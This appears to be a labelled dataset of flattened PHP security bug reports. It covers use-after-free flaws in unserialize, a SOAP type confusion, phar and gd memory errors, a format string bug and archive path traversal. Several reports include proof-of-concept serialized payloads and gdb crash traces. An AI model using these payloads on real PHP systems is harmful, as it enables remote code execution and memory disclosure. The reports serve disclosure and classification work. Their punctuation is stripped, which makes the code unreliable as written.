use after free vulnerability in unserialize with splarrayobject if p x p goto outexcept p alloc_init_zval pflags if php_var_unserialize pflags p s buf_len var_hash tsrmls_cc z_type_p pflags is_long zval_ptr_dtor pflags goto outexcept p for flags z_lval_p pflags zval_ptr_dtor pflags free memory if p m if p a p o p c p r goto outexcept intern ar_flags spl_array_clone_mask intern ar_flags flags spl_array_clone_mask zval_ptr_dtor intern array alloc_init_zval intern array if php_var_unserialize intern array p s buf_len var_hash tsrmls_cc use freed memory and double-free it via crafted serialized string goto outexcept if p m p goto outexcept p alloc_init_zval pmembers if php_var_unserialize pmembers p s buf_len var_hash tsrmls_cc z_type_p pmembers is_array control and use freed memory via r or r zval_ptr_dtor pmembers goto outexcept pflags was be freed but we can use that already freed memory and double-free it via crafted serialized string ex dateinterval wakeup and other objects so we can control and use that doubles freed memory via r and r it is possible to use-after-free attack and execute arbitrary code remotely poc1 inner x i:0 o:12 dateinterval 1 s:1 y r:3 m a:1 i:0 r:2 exploit c:11 arrayobject strlen inner inner data unserialize exploit for i 0 i 5 i v i hi i var_dump data poc2 class test var ryat function wakeup this ryat ryat inner x i:0 o:4 test 1 s:4 ryat r:3 m a:1 i:0 r:2 exploit c:11 arrayobject strlen inner inner data unserialize exploit for i 0 i 5 i v i hi i var_dump data	11
use after free vulnerability in unserialize with splobjectstorage i has reported a similar bug in bug 70166 if p x p goto outexcept p alloc_init_zval pcount if php_var_unserialize pcount p s buf_len var_hash tsrmls_cc z_type_p pcount is_long goto outexcept p for count z_lval_p pcount done reading serialized if pcount zval_ptr_dtor pcount free memory php_var_unserialize_destroy var_hash return pcount was be freed but we can use that already freed memory via r and r it is possible to use-after-free attack and execute arbitrary code remotely poc inner x i:1 o:8 stdclass 0 m a:0 exploit a:2 i:0 c:16 splobjectstorage strlen inner inner i:1 r:3 data unserialize exploit for i 0 i 5 i v i hi i var_dump data	11
use after free vulnerability in unserialize with splarrayobject i has reported some similar bugs in bug 69425 but these bugs are not be fixed and can be exploited still if p m if p a p o p c p r goto outexcept intern ar_flags spl_array_clone_mask intern ar_flags flags spl_array_clone_mask zval_ptr_dtor intern array alloc_init_zval intern array if php_var_unserialize intern array p s buf_len var_hash tsrmls_cc goto outexcept if p goto outexcept p members if p m p goto outexcept p alloc_init_zval pmembers if php_var_unserialize pmembers p s buf_len var_hash tsrmls_cc z_type_p pmembers is_array zval_ptr_dtor pmembers goto outexcept unserialize allow to use r or r to set references so attacker can set references to intern array and freed it then set references via pmembers will use that already freed memory it is possible to execute arbitrary code remotely poc1 inner x i:0 o:12 dateinterval 1 s:1 y r:3 m a:1 i:0 r:2 exploit c:11 arrayobject strlen inner inner data unserialize exploit for i 0 i 5 i v i hi i var_dump data poc2 class test var ryat function wakeup this ryat ryat inner x i:0 o:4 test 1 s:4 ryat r:3 m a:1 i:0 r:2 exploit c:11 arrayobject strlen inner inner data unserialize exploit for i 0 i 5 i v i hi i var_dump data	11
use after free vulnerability in unserialize with spldoublylinkedlist i has reported a similar bug in flags was be freed but we can use that already freed memory via r and r it is possible to use-after-free attack and execute arbitrary code remotely	11
dangling pointer in the unserialization of arrayobject items summary during unserialization of an arrayobject a dangling pointer to a zval is inadvertantly created by correctly crafting their input to unserialize an attacker can cause this dangling pointer to be swapped into the array field of the spl_array_object which is created during unserialization the attacker can then cause the deallocated zval to be reallocated and initialized with data that they fully control the outcome of this is that spl_array_object array points to a forged zval structure and as shown in prior research an attacker has many paths from there towards code execution the most common approach being to set the type field of the zval to equal is_array and rewrite the ht field to point to a forged hashtable structure on destruction if the forged hashtable contains a pointer to a destructor function then this will be called impact this vulnerability can be leveraged to achieve remote code execution any application that calls unserialize on user provided data is potentially vulnerable although exploitation will be somewhat application specific patch details the patch updates spl_method array unserialize to ensure that the pflags variable is not destroyed until after the var_hash which contains a reference to it bug details file ext/spl/spl_array.c 1736 spl_method array unserialize 1737 1744 zval pmembers pflags null 1771 alloc_init_zval pflags 1772 if php_var_unserialize pflags p s buf_len var_hash tsrmls_cc z_type_p pflags is_long 1773 zval_ptr_dtor pflags 1774 goto outexcept 1775 1776 1777 p for 1778 flags z_lval_p pflags 1779 zval_ptr_dtor pflags during unserialization the var_hash variable is used to record pointers to the zval structures associated with the unserialized data the outcome of this is that after php_var_unserialize the var_hash structure contains the value of the pflags variable under normal operation this is perfectly fine as the var_hash structure is used to handle the unserialization of references e.g when a reference field is encountered in the serialized data it indicates what it actually references by means of an index this index is really an index into the var_hash structure the problem is the call to zval_ptr_dtor on line 1779 after this call var_hash still contains the address of the zval pointed to by pflags but the memory backing this zval has been returned to the heap the questiont then becomes is it possible to access and use this dangling pointer before the var_hash structure is itself destroyed as it happens this is fairly straightforward as the following code is soon executed file ext/spl/spl_array.c 1790 if p m 1791 if p a p o p c p r 1792 goto outexcept 1793 1794 intern ar_flags spl_array_clone_mask 1795 intern ar_flags flags spl_array_clone_mask 1796 zval_ptr_dtor intern array 1797 alloc_init_zval intern array 1798 if php_var_unserialize intern array p s buf_len var_hash tsrmls_cc 1799 goto outexcept 1800 1801 in the above code p has type unsigned char and points to the string being unserialized at this stage it points towards the indicator for the type of the next item to be unserialized so if the next character in the sequence is not m and holds one of the characters compared against on line 1791 php_var_unserialize will be called again and provided the var_hash which contains the dangling pointer with some knowledge of how php unserializes items we can see that these conditions are exactly what we require the r item type is the indicator for a reference and during the unserialization of a reference the var_hash structure will consulted to retrieve the appropriate zval which will then be swapped into the first argument to php_var_unserialize a zval file ext/standard/var_unserializer.re 507 r iv 508 long id 509 510 p yycursor 511 if var_hash return 0 512 513 id parse_iv start 2 1 514 if id 1 var_access var_hash id rval_ref success 515 return 0 516 517 518 if rval rval_ref return 0 519 520 if rval null 521 var_push_dtor_no_addref var_hash rval 522 523 rval rval_ref 524 z_addref_pp rval 525 z_unset_isref_pp rval 526 527 return 1 528 on line 514 the var_hash structure is consulted to find the appropriate zval this pointer is then swapped into the first argument to php_var_unserialize on line 523 once this handler returns the intern array variable in spl_method array unserialize contains the dangling pointer we can demonstrate this by providing the string c:11 arrayobject 20 x i:0 r:2 m a:0 to unserialize gdb q git/php-src/sapi/cli/php reading symbols from home/sean/git/php-src/sapi/cli/php done gdb b zim_spl_array_unserialize breakpoint 1 at file home/sean/git/php-src/ext/spl/spl_array.c line 1737 gdb r deserialise.php tmp/simple_poc.sz starting program home/sean/git/php-src/sapi/cli/php deserialise.php tmp/simple_poc.sz c:11 arrayobject 20 x i:0 r:2 m a:0 breakpoint 1 zim_spl_array_unserialize ht=1 return_value return_value_ptr this_ptr return_value_used=1 at home/sean/git/php-src/ext/spl/spl_array.c:1737 1737 gdb l 1732 1733 proto void arrayobject unserialize string serialized 1734 unserialize the object 1735 1736 spl_method array unserialize 1737 1738 spl_array_object intern spl_array_object zend_object_store_get_object getthis tsrmls_cc 1739 1740 char buf 1741 int buf_len gdb 1742 const unsigned char p s 1743 php_unserialize_data_t var_hash 1744 zval pmembers pflags null 1745 hashtable aht 1746 long flags 1747 1748 if zend_parse_parameters zend_num_args tsrmls_cc s buf buf_len failure 1749 return 1750 1751 gdb 1752 if buf_len 0 1753 return 1754 1755 1756 aht spl_array_get_hash_table intern 0 tsrmls_cc 1757 if aht napplycount 0 1758 zend_error e_warning modification of arrayobject during sorting is prohibited 1759 return 1760 1761 gdb 1762 storage 1763 s p const unsigned char buf 1764 php_var_unserialize_init var_hash 1765 1766 if p x p 1767 goto outexcept 1768 1769 p 1770 1771 alloc_init_zval pflags gdb 1772 if php_var_unserialize pflags p s buf_len var_hash tsrmls_cc z_type_p pflags is_long 1773 zval_ptr_dtor pflags 1774 goto outexcept 1775 1776 1777 p for 1778 flags z_lval_p pflags 1779 zval_ptr_dtor pflags 1780 flags needs to be verified and we also need to verify whether the next 1781 thing we get is after that we require an m or somethign else gdb b 1779 breakpoint 2 at file home/sean/git/php-src/ext/spl/spl_array.c line 1779 gdb c continuing breakpoint 2 zim_spl_array_unserialize ht=1 return_value return_value_ptr this_ptr return_value_used=1 at home/sean/git/php-src/ext/spl/spl_array.c:1779 1779 zval_ptr_dtor pflags gdb p/x pflags 1 gdb p/x var_entries var_hash last data 2 we have hit a breakpoint just before the pflags structure is destroyed at this point we can see that a pointer to the pflags structure is stored within the var_hash structure gdb s zval_ptr_dtor zval_ptr at home/sean/git/php-src/zend/zend_execute_api.c:424 424 i_zval_ptr_dtor zval_ptr zend_file_line_relay_cc tsrmls_cc gdb i_zval_ptr_dtor zval_ptr at home/sean/git/php-src/zend/zend_execute_api.c:424 424 i_zval_ptr_dtor zval_ptr zend_file_line_relay_cc tsrmls_cc gdb zval_delref_p pz at home/sean/git/php-src/zend/zend.h:411 411 return pz refcount__gc gdb i_zval_ptr_dtor zval_ptr at home/sean/git/php-src/zend/zend_execute.h:76 76 if z_delref_p zval_ptr gdb 78 gc_remove_zval_from_buffer zval_ptr gdb n 79 zval_dtor zval_ptr gdb s zval_dtor zvalue at home/sean/git/php-src/zend/zend_variables.h:32 32 if zvalue type is_bool gdb n i_zval_ptr_dtor zval_ptr at home/sean/git/php-src/zend/zend_execute.h:80 80 efree_rel zval_ptr gdb s efree ptr at home/sean/git/php-src/zend/zend_alloc.c:2436 2436 if unexpected ag mm_heap use_zend_alloc the pflags structure has now been destroyed and the reference to it from var_hash is dangling gdb finish run till exit from 0 efree ptr at home/sean/git/php-src/zend/zend_alloc.c:2436 in i_zval_ptr_dtor zval_ptr at home/sean/git/php-src/zend/zend_execute.h:80 80 efree_rel zval_ptr gdb n zval_ptr_dtor zval_ptr at home/sean/git/php-src/zend/zend_execute_api.c:425 425 gdb zim_spl_array_unserialize ht=1 return_value return_value_ptr this_ptr return_value_used=1 at home/sean/git/php-src/ext/spl/spl_array.c:1785 1785 if p gdb l 1780 flags needs to be verified and we also need to verify whether the next 1781 thing we get is after that we require an m or somethign else 1782 where m stands for members and anything else should be an array if 1783 neither a or m follows we have an error 1784 1785 if p 1786 goto outexcept 1787 1788 p 1789 gdb 1790 if p m 1791 if p a p o p c p r 1792 goto outexcept 1793 1794 intern ar_flags spl_array_clone_mask 1795 intern ar_flags flags spl_array_clone_mask 1796 zval_ptr_dtor intern array 1797 alloc_init_zval intern array 1798 if php_var_unserialize intern array p s buf_len var_hash tsrmls_cc 1799 goto outexcept gdb 1800 1801 1802 if p 1803 goto outexcept 1804 1805 p 1806 1807 members 1808 if p m p 1809 goto outexcept gdb b 1798 breakpoint 3 at file home/sean/git/php-src/ext/spl/spl_array.c line 1798 gdb c continuing breakpoint 3 zim_spl_array_unserialize ht=1 return_value return_value_ptr this_ptr return_value_used=1 at home/sean/git/php-src/ext/spl/spl_array.c:1798 1798 if php_var_unserialize intern array p s buf_len var_hash tsrmls_cc gdb x/s p r:2 m a:0 gdb p/x intern array 3 prior to the php_var_unserialize call using our reference item intern array points to the zval created on line 1797 gdb n 1802 if p gdb p/x intern array 4 after php_var_unserialize returns intern array points to the deallocated structure from an attackers point of view the remaining work is to get the the deallocated zval reallocated using data which they control and then to trigger its use via the intern array pointer this is fairly straightforward and is explained in the attached python script for generating a poc input see crash_record.txt for a demonstration of what will happen when this poc is fed to unserialize eof test script write the following to a file and feed the file to the script below to trigger the bug a:3 i:0 c:11 arrayobject 20 x i:0 r:3 m a:0 i:1 d:11 i:2 s:31 aaaaaaaabbbbcccc\01\00\00\00\04\00\00\00\00\00\00\00\00\00\00 php handle fopen argv 1 r if handle line fgets handle echo line fclose handle data unserialize line else echo failed to open argv 1 actual result gdb r deserialise.php poc.sz the program being debugged has been started already start it from the beginning y or n y starting program home/sean/git/php-src/sapi/cli/php deserialise.php poc.sz a:3 i:0 c:11 arrayobject 20 x i:0 r:3 m a:0 i:1 d:11 i:2 s:31 aaaaaaaabbbbcccc\01\00\00\00\04\00\00\00\00\00\00\00\00\00\00 program received signal sigsegv segmentation fault in zend_hash_destroy ht at home/sean/git/php-src/zend/zend_hash.c:543 543 p ht plisthead gdb bt 0 in zend_hash_destroy ht at home/sean/git/php-src/zend/zend_hash.c:543 1 in zval_dtor_func zvalue at home/sean/git/php-src/zend/zend_variables.c:45 2 in zval_dtor zvalue at home/sean/git/php-src/zend/zend_variables.h:35 3 i_zval_ptr_dtor zval_ptr at home/sean/git/php-src/zend/zend_execute.h:79 4 zval_ptr_dtor zval_ptr at home/sean/git/php-src/zend/zend_execute_api.c:424 5 in spl_array_object_free_storage object at home/sean/git/php-src/ext/spl/spl_array.c:152 6 in zend_objects_store_del_ref_by_handle_ex handle=1 handlers spl_handler_arrayobject at home/sean/git/php-src/zend/zend_objects_api.c:226 7 in zend_objects_store_del_ref zobject at home/sean/git/php-src/zend/zend_objects_api.c:178 8 in zval_dtor_func zvalue at home/sean/git/php-src/zend/zend_variables.c:57 9 in zval_dtor zvalue at home/sean/git/php-src/zend/zend_variables.h:35 10 i_zval_ptr_dtor zval_ptr at home/sean/git/php-src/zend/zend_execute.h:79 11 zval_ptr_dtor zval_ptr at home/sean/git/php-src/zend/zend_execute_api.c:424 12 in zend_hash_destroy ht at home/sean/git/php-src/zend/zend_hash.c:548 13 in zval_dtor_func zvalue at home/sean/git/php-src/zend/zend_variables.c:45 14 in zval_dtor zvalue at home/sean/git/php-src/zend/zend_variables.h:35 15 i_zval_ptr_dtor zval_ptr at home/sean/git/php-src/zend/zend_execute.h:79 16 zval_ptr_dtor zval_ptr at home/sean/git/php-src/zend/zend_execute_api.c:424 17 in i_zend_hash_bucket_delete p ht executor_globals+360 at home/sean/git/php-src/zend/zend_hash.c:182 18 zend_hash_bucket_delete ht executor_globals+360 p at home/sean/git/php-src/zend/zend_hash.c:192 19 in zend_hash_graceful_reverse_destroy ht executor_globals+360 at home/sean/git/php-src/zend/zend_hash.c:613 20 in shutdown_executor at home/sean/git/php-src/zend/zend_execute_api.c:244 21 in zend_deactivate at home/sean/git/php-src/zend/zend.c:960 22 in php_request_shutdown dummy at home/sean/git/php-src/main/main.c:1883 23 in do_cli argc=3 argv at home/sean/git/php-src/sapi/cli/php_cli.c:1177 24 in main argc=3 argv at home/sean/git/php-src/sapi/cli/php_cli.c:1378 gdb i r rax 4702111234474983745 rbx 0 rcx 210709757247 rdx 4702111234474983745 rsi 140737353915976 rdi 4702111234474983745 rbp rsp r8 17138336 r9 8 r10 555 r11 140737338097200 r12 4327376 r13 140737488346032 r14 0 r15 0 rip zend_hash_destroy+16 eflags if rf cs 51 ss 43 ds 0 es 0 fs 0 gs 0 gdb x/i rip zend_hash_destroy+16 mov rax qword ptr rax gdb l 538 539 is_consistent ht 540 541 set_inconsistent ht_is_destroying 542 543 p ht plisthead 544 while p null 545 q p 546 p p plistnext 547 if ht pdestructor gdb 548 ht pdestructor q pdata 549 550 if q pdata q pdataptr 551 pefree q pdata ht persistent 552 553 pefree q ht persistent 554 555 if ht ntablemask 556 pefree ht arbuckets ht persistent 557 gdb	11
files extracted from archive may be placed outside of destination directory by modifying filenames in archive to contain paths like somefile.ext after extracting they may be placed in directories outer to destination directory	6
soap serialize_function_call type confusion rce a type confusion occurs within soap serialize_function_call due to an insufficient validation of the headers field in the soapclient s call method the verify_soap_headers_array check is applied only to headers retrieved from zend_parse_parameters problem is that a few lines later soap_headers could be updated or even replaced with values from the default_headers object fields soap.c if zend_hash_find z_objprop_p this_ptr default_headers sizeof default_headers void tmp success z_type_pp tmp is_array 2913 hashtable default_headers z_arrval_p tmp 2914 if soap_headers 2915 if free_soap_headers 2916 hashtable t emalloc sizeof hashtable 2917 zend_hash_init t 0 null zval_ptr_dtor 0 2918 zend_hash_copy t soap_headers copy_ctor_func_t zval_add_ref null sizeof zval 2919 soap_headers t 2920 free_soap_headers 1 2921 2922 zend_hash_internal_pointer_reset default_headers 2923 while zend_hash_get_current_data default_headers void tmp success 2924 z_addref_pp tmp 2925 zend_hash_next_index_insert soap_headers tmp sizeof zval null 2926 zend_hash_move_forward default_headers 2927 2928 else 2929 soap_headers z_arrval_p tmp 2930 free_soap_headers 0 2931 in such case the soap_headers array is no longer assured to be holding objects only thus leading to a type confusion when serialize_function_call will try to access its elements through 4351 hashtable ht z_objprop_pp header the described scenario applies to latest versions of each php branch exploitation on php7 is much easier since supplying a numeric zval to z_objpro_pp results is full control over the obj.handlers pointer the same result could be achieved in php5 leveraging on a string length but the exploitability would then depend on the memory layout test script php7 php gdb r poc1.php starting program home/php-7/bin/php home/poc1.php thread debugging using libthread_db enabled program received signal sigsegv segmentation fault in serialize_function_call this_ptr function function_name notexisting uri x arguments arg_count=0 version=1 soap_headers at home/php-7/ext/soap/soap.c:4335 4335 hashtable ht z_objprop_p header gdb x/i pc serialize_function_call+2214 mov rax rax gdb p rax 63 1337 dummy unserialize o:10 soapclient 3 s:3 uri s:1 x s:8 location s:22 s:17 default_headers a:1 i:1 i:1337 var_dump dummy notexisting php5 php gdb r poc2.php starting program usr/bin/php home/poc2.php thread debugging using libthread_db enabled program received signal sigsegv segmentation fault in serialize_function_call this_ptr function function_name notexisting uri x arguments arg_count=0 version=1 soap_headers at home/php-5.6.11/ext/soap/soap.c:4351 4351 hashtable ht z_objprop_pp header gdb x/i pc serialize_function_call+2145 mov rax rax gdb p rax 4 1337 dummy unserialize o:10 soapclient 3 s:3 uri s:1 x s:8 location s:22 s:17 default_headers a:1 i:1 s:1337 str_repeat x 1337 var_dump dummy notexisting	11
null pointer dereference in phar_get_fp_offset if a tar entry has the link indicator set and points to an nonexisting file phar_get_link_source returns a null value phar/util.c:69 the null value gets passed into phar_get_fp_offset at util.c:497 the null pointer dereference occurs in phar_internal.h:444 where entry is null if entry is_persistent this causes php to seg fault proof of concept php readphar.php null_ptr_deref_in_phar_get_fp_offset.tar.phar segmentation fault	11
uninitialized pointer in phar_make_dirstream when zip entry filename is when parsing a phar file in zip format phar_parse_zipfile in ext/phar/zip.c with a directory entry with filename the filename length is 1 to start with but then because it is a directory it is decremented to 0 line 399 of ext/phar/zip.c which causes it to get added to the manifest hash as a type long not as a type string line 639 of ext/phar/zip.c when making the dirstream from the phar file after loading the zip function phar_make_dirstream in ext/phar/dirstream.c the manifest hash is used but the return is not checked for a string type which is what it expects line 201 in ext/phar/dirstream.c in this case a long is returned and the two variables str_key and keylen are not set the str_key is further used to set the filename this will cause a crash when compiled with hardening options such as d_fortify_source=2 and fstack-protector-all and no optimizations o flags or when compiled with asan when compiled any other way that i ve tried it does n't crash but occasionally leaks data into the filename field outputted this bug was found with afl-fuzz the zip file passed to the script below is available at and has the hexdump of below 00000000 50 4b 03 04 30 30 30 30 30 30 30 30 30 30 30 30 pk 000000000000 00000010 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 0000000000000000 000000c0 30 30 30 30 30 30 30 30 50 4b 01 02 30 30 30 30 00000000pk 0000 000000d0 30 30 08 00 30 30 30 30 30 30 30 30 30 30 30 30 00 000000000000 000000e0 30 30 30 30 01 00 00 00 00 00 30 30 30 30 30 30 0000 000000 000000f0 30 30 30 30 30 30 2f 50 4b 05 06 00 00 00 00 01 000000/pk 00000100 00 01 00 30 30 30 30 c8 0000 00000108 to fix a check the return type of zend_hash_get_current_key_ex for more than just non existent ie for long as well maybe fail if type is not string or b do n't decrement the entry.filename_len in parse_zip if it would set the length to 0 that would mean it is stored in the hash as a string not a long i m not too sure of the logic of this so do n't know if that reasoning is right also i have n't checked other filetypes for phar potentially a similar issue is there as well cheers hugh test script php phar new phardata argv 1 var_dump phar meta phar getmetadata var_dump meta expected result no crash or memory leaked actual result when compiled with asan gdb bt 0 in memcmp from usr/lib/x86_64-linux-gnu/libasan.so.0 1 in phar_make_dirstream dir manifest at root/php-src/ext/phar/dirstream.c:216 2 in phar_wrapper_open_dir wrapper optimized out path optimized out mode optimized out options=0 opened_path optimized out context at root/php-src/ext/phar/dirstream.c:359 3 in php_stream_opendir path=path entry phar root/fuzz-test.zip options=options entry=8 context at root/php-src/main/streams/streams.c:1986 4 in spl_filesystem_dir_open intern=intern entry path phar root/fuzz-test.zip at root/php-src/ext/spl/spl_directory.c:250 5 in spl_filesystem_object_construct ctor_flags=1 return_value_used optimized out this_ptr return_value_ptr optimized out return_value optimized out ht optimized out at root/php-src/ext/spl/spl_directory.c:731 6 zim_spl_recursivedirectoryiterator___construct ht optimized out return_value optimized out return_value_ptr optimized out this_ptr return_value_used optimized out at root/php-src/ext/spl/spl_directory.c:1596 7 in zend_call_function fci=fci entry fci_cache at root/php-src/zend/zend_execute_api.c:847 8 in zend_call_method object_pp=object_pp entry obj_ce optimized out fn_proxy=fn_proxy entry function_name=function_name entry construct function_name_len=function_name_len entry=11 retval_ptr_ptr=retval_ptr_ptr entry param_count=param_count entry=2 arg1=arg1 entry arg2=arg2 entry at root/php-src/zend/zend_interfaces.c:97 9 in zim_phar___construct ht optimized out return_value optimized out return_value_ptr optimized out this_ptr optimized out return_value_used optimized out at root/php-src/ext/phar/phar_object.c:1255 10 in zend_do_fcall_common_helper_spec execute_data at root/php-src/zend/zend_vm_execute.h:558 11 in execute_ex execute_data at root/php-src/zend/zend_vm_execute.h:363 12 in zend_execute_scripts type=type entry=8 retval=retval entry file_count=file_count entry=3 at root/php-src/zend/zend.c:1341 13 in php_execute_script primary_file=primary_file entry at root/php-src/main/main.c:2597 14 in do_cli argc=3 argv at root/php-src/sapi/cli/php_cli.c:994 15 in main argc=3 argv at root/php-src/sapi/cli/php_cli.c:1378 gdb frame 1 1 in phar_make_dirstream dir manifest at root/php-src/ext/phar/dirstream.c:216 216 if keylen sizeof phar 1 memcmp str_key phar sizeof phar 1 gdb print str_key 1 gdb print keylen 2 28369926 when compiled without optimization and with hardening options gdb bt 0 memcmp_sse4_1 at sysdeps/x86_64/multiarch/memcmp-sse4.s:878 1 in phar_make_dirstream dir manifest at root/php-src/ext/phar/dirstream.c:216 2 in phar_wrapper_open_dir wrapper php_stream_phar_wrapper path phar root/fuzz-test.zip mode r options=0 opened_path context at root/php-src/ext/phar/dirstream.c:367 3 in php_stream_opendir path phar root/fuzz-test.zip options=8 context at root/php-src/main/streams/streams.c:1986 4 in spl_filesystem_dir_open intern path phar root/fuzz-test.zip at root/php-src/ext/spl/spl_directory.c:250 5 in spl_filesystem_object_construct ht=2 return_value return_value_ptr this_ptr return_value_used=1 ctor_flags=1 at root/php-src/ext/spl/spl_directory.c:731 6 in zim_spl_recursivedirectoryiterator___construct ht=2 return_value return_value_ptr this_ptr return_value_used=1 at root/php-src/ext/spl/spl_directory.c:1596 7 in zend_call_function fci fci_cache at root/php-src/zend/zend_execute_api.c:847 8 in zend_call_method object_pp obj_ce fn_proxy function_name construct function_name_len=11 retval_ptr_ptr param_count=2 arg1 arg2 at root/php-src/zend/zend_interfaces.c:97 9 in zim_phar___construct ht=1 return_value return_value_ptr this_ptr return_value_used=0 at root/php-src/ext/phar/phar_object.c:1255 10 in zend_do_fcall_common_helper_spec execute_data at root/php-src/zend/zend_vm_execute.h:558 11 in zend_do_fcall_by_name_spec_handler execute_data at root/php-src/zend/zend_vm_execute.h:693 12 in execute_ex execute_data at root/php-src/zend/zend_vm_execute.h:363 13 in zend_execute op_array at root/php-src/zend/zend_vm_execute.h:388 14 in zend_execute_scripts type=8 retval file_count=3 at root/php-src/zend/zend.c:1341 15 in php_execute_script primary_file at root/php-src/main/main.c:2597 16 in do_cli argc=3 argv at root/php-src/sapi/cli/php_cli.c:994 17 in main argc=3 argv at root/php-src/sapi/cli/php_cli.c:1378 gdb frame 1 1 in phar_make_dirstream dir manifest at root/php-src/ext/phar/dirstream.c:226 216 if keylen sizeof phar 1 memcmp str_key phar sizeof phar 1 gdb p str_key 1 error can not access memory at address gdb p keylen 2 19	11
use after free in collator sortwithsortkeys this is a vulnerability is in the function collator sortwithsortkeys the vulnerable code is in ext/intl/collator/collator_sort.c 1 given an array each element hashdata is being referenced by a pointer in sortkeyindxbuf sortkeycount zstr line 493 414 hash z_arrval_p array 425 zend_hash_foreach_val hash hashdata 493 sortkeyindxbuf sortkeycount zstr hashdata 2 the array is then destroy and it s hashdata elements freed ref count 1 508 zval_ptr_dtor array 3 note that at this point sortkeyindxbuf sortkeycount zstr still contain pointers to the hashdata elements which has been freed in essence sortkeyindxbuf sortkeycount zstr are dangling pointers 4 a new array is reinitialized 510 array_init array 5 the dangling pointers are then added as elements into the new array 515 zend_hash_next_index_insert z_arrval_p array sortkeyindxbuf j zstr 6 i ve included a poc that triggers this vulnerability resulting in a null pointer dereference the poc can be obtained via an array of elements is being passed into the function sortkeyindxbuf 0 zstr to sortkeyindxbuf zstr points to the elements in the array array is destroyed via zval_ptr_dtor array sortkeyindxbuf 0 zstr are now dangling pointers new array initialized hashtable with initial element size of 8 as the dangling pointers are added to array the size of the hashtable grows as the hashtable grows it s allocated more memory via zend_hash_do_resize it will then be allocated memory that co-incides with an address pointed to by the dangling pointer sortkeyindxbuf j zstr thus sortkeyindxbuf j zstr now no longer points to a valid zval when the code below dereferences this address because it is pointing to an invalid zval it will access dereference whatever is the value within this corrupted zval in this case it s a null pointer dereference 514 z_try_addref_p sortkeyindxbuf j zstr stopped reason sigsegv in zval_addref_p pz at home/elaw/php-7.0.0rc8/zend/zend_types.h:822 822 return gc_refcount z_counted_p pz gdb-peda bt 0 in zval_addref_p pz at home/elaw/php-7.0.0rc8/zend/zend_types.h:822 1 zif_collator_sort_with_sort_keys execute_data return_value at home/elaw/php-7.0.0rc8/ext/intl/collator/collator_sort.c:514 2 in zend_do_fcall_spec_handler at home/elaw/php-7.0.0rc8/zend/zend_vm_execute.h:842 3 in execute_ex ex at home/elaw/php-7.0.0rc8/zend/zend_vm_execute.h:414 4 in zend_execute op_array return_value at home/elaw/php-7.0.0rc8/zend/zend_vm_execute.h:458 5 in zend_execute_scripts type retval file_count at home/elaw/php-7.0.0rc8/zend/zend.c:1428 6 in php_execute_script primary_file at home/elaw/php-7.0.0rc8/main/main.c:2471 7 in do_cli argc argv at home/elaw/php-7.0.0rc8/sapi/cli/php_cli.c:974 8 in main argc argv at home/elaw/php-7.0.0rc8/sapi/cli/php_cli.c:1345 9 in libc_start_main main main argc argv init optimized out fini optimized out rtld_fini optimized out stack_end at libc-start.c:287 10 in start this bug seems to have been introduced in this commit bug introducted in only php 7 is affected test script configure enable-intl make php collate-uaf-poc.php	11
format string vulnerability in class name error message a format string vulnerability exists in php-7.0.0 due to how non-existent class names are handled from my limited research i believe this issue is exploitable for full code execution see test script below this issue does not appear to be present in previous php version also note that this is not the same issue as 70895 or 70914 i am not intimately familiar with the code-base so i ca n't say with 100 certainty what the cause is or fix should be but zend/zend_execute_api.c:221 looks very suspicious see patch adding a s as the second parameter there seems to fix the issue test script simple example segfault php name n n n name dosomething write-what-where example andrew thinkpad tmp/php-7.0.0_64 cat tmp/test.php php ini_set memory_limit 4g rdx what rax where name rdx 8 d d n str_repeat a rax 34 name dosomething andrew thinkpad tmp/php-7.0.0_64 gdb sapi/cli/php gnu gdb gdb 7.10 copyright c 2015 free software foundation inc license gplv3 gnu gpl version 3 or later this is free software you are free to change and redistribute it there is no warranty to the extent permitted by law type show copying and show warranty for details this gdb was configured as x86_64-unknown-linux-gnu type show configuration for configuration details for bug reporting instructions please see find the gdb manual and other documentation resources online at for help type help type apropos word to search for commands related to word reading symbols from sapi/cli/php done gdb r tmp/test.php starting program tmp/php-7.0.0_64/sapi/cli/php tmp/test64.php thread debugging using libthread_db enabled using host libthread_db library usr/lib/libthread_db.so.1 program received signal sigsegv segmentation fault in xbuf_format_converter xbuf=xbuf entry is_char=is_char entry=1 001 fmt optimized out ap at tmp/php-7.0.0_64/main/spprintf.c:744 744 va_arg ap int is_char int smart_string xbuf len int zstr_len smart_str xbuf s gdb i r rax 1128481603 rbx 140736188121110 rcx 110 rdx 1111638594 rsi 140737488330160 rdi 140737488332376 rbp rsp r8 140737488330160 r9 140736188121110 r10 0 r11 0 r12 32 r13 140737488332304 r14 0 r15 1111638586 rip xbuf_format_converter+1845 eflags if rf cs 51 ss 43 ds 0 es 0 fs 0 gs 0 gdb x/1i rip xbuf_format_converter+1845 mov dword ptr rax edx gdb	11
memory read via gdimagerotateinterpolated array index out of bounds this is the function prototype for imagerotate resource imagerotate resource image float angle int bgd_color int ignore_transparent 0 bgd_color specifies the background color of an image have it has been rotated this is passed in as an integer that represents an index to the color palette there is a lack of validation of bgd_color one can pass in a large number that exceeds the color palette array this reads memory beyond the color palette information of the memory leak can then be obtained via the background color after the image has been rotated test script configure with-gd 1 pass in a large bgd_color php r imagerotate imagecreate 1,1 45 2 this causes it to crash at gd_interpolation.c:2174 stopped reason sigsegv in gdimagerotateinterpolated src angle=45 bgcolor at php-5.6.15/ext/gd/libgd/gd_interpolation.c:2174 2174 bgcolor gdtruecoloralpha src red bgcolor src green bgcolor src blue bgcolor src alpha bgcolor gdb-peda bt 0 in gdimagerotateinterpolated src angle=45 bgcolor at home/elaw/php-5.6.15/ext/gd/libgd/gd_interpolation.c:2174 1 in zif_imagerotate ht return_value return_value_ptr this_ptr return_value_used at home/elaw/php-5.6.15/ext/gd/gd.c:2111 2 in zend_do_fcall_common_helper_spec execute_data at home/elaw/php-5.6.15/zend/zend_vm_execute.h:558 3 in zend_do_fcall_spec_const_handler execute_data at home/elaw/php-5.6.15/zend/zend_vm_execute.h:2602 4 in execute_ex execute_data at home/elaw/php-5.6.15/zend/zend_vm_execute.h:363 5 in zend_execute op_array at home/elaw/php-5.6.15/zend/zend_vm_execute.h:388 6 in zend_eval_stringl str imagerotate imagecreate 1,1 45,2147483641 str_len retval_ptr string_name command line code at home/elaw/php-5.6.15/zend/zend_execute_api.c:1077 7 in zend_eval_stringl_ex str imagerotate imagecreate 1,1 45,2147483641 str_len retval_ptr string_name command line code handle_exceptions at home/elaw/php-5.6.15/zend/zend_execute_api.c:1124 8 in zend_eval_string_ex str imagerotate imagecreate 1,1 45,2147483641 retval_ptr 